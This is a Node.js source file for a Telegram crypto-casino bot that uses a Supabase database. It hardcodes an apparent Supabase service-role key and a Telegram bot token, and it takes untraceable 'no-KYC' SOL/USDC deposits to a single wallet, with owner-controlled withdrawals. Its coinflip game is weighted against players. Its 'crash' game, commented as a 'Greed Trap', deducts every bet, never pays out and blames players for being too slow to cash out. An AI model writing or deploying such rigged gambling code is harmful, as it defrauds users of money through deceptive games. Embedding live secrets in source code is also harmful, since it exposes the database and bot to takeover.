const { Telegraf } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- KEYS ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAEZAn-g8qZT3Lo72zgb5ph3ZMyZdmfVtMM";
// ------------

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();
const PORT = process.env.PORT || 10000;

// DB Helpers
async function getAccount(userId, username) {
  let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
  if (!data) {
    const { data: newUser } = await supabase.from('users').insert([{ user_id: userId, username: username || 'anon', balance: 0 }]).select().single();
    return newUser;
  }
  return data;
}
async function updateBal(userId, newBal) {
  await supabase.from('users').update({ balance: newBal }).eq('user_id', userId);
}

// --- NO-KYC CRYPTO SYSTEM ---
bot.command('deposit', (ctx) => {
  ctx.reply(`🔌 NO-KYC DEPOSIT\n\nSend SOL/USDC to:\n\`CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x\`\n\nAfter sending, DM the owner with your ID: \`${ctx.from.id}\``, { parse_mode: 'Markdown' });
});

bot.command('withdraw', (ctx) => {
  ctx.reply("💸 WITHDRAWAL\n\nUsage: /withdraw [amount] [address]\n\nNote: Withdrawals are processed within 24h after house verification.");
});

// --- GAME 1: COINFLIP (The "Easy" 50/50) ---
bot.command('flip', async (ctx) => {
  const user = await getAccount(ctx.from.id, ctx.from.username);
  const bet = parseInt(ctx.message.text.split(' ')[1]);
  if (!bet || bet <= 0 || user.balance < bet) return ctx.reply("❌ Low Liquidity.");

  await updateBal(ctx.from.id, user.balance - bet);
  const win = Math.random() > 0.52; // 52% House Edge

  ctx.reply(win ? `🪙 HEADS! You won ${bet * 2}!` : `🪙 TAILS. Rekt.`);
  if (win) await updateBal(ctx.from.id, user.balance + bet);
});

// --- GAME 2: CRASH (The Greed Trap) ---
bot.command('crash', async (ctx) => {
  const user = await getAccount(ctx.from.id, ctx.from.username);
  const bet = parseInt(ctx.message.text.split(' ')[1]);
  if (!bet || bet <= 0 || user.balance < bet) return ctx.reply("❌ Low Liquidity.");

  await updateBal(ctx.from.id, user.balance - bet);
  
  // Logic: 10% chance it crashes at 1.0x immediately (Instant House Win)
  const crashPoint = Math.random() < 0.1 ? 1.0 : (Math.random() * 3 + 1).toFixed(2);
  
  ctx.reply(`🚀 Rocket launched...\n💥 CRASHED AT ${crashPoint}x`);
  
  if (crashPoint > 1.5) { // Only pays out if it "felt" like a good run
     ctx.reply(`Too slow on the cashout!`);
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Lord Cord Casino Live`);
  bot.launch();
});
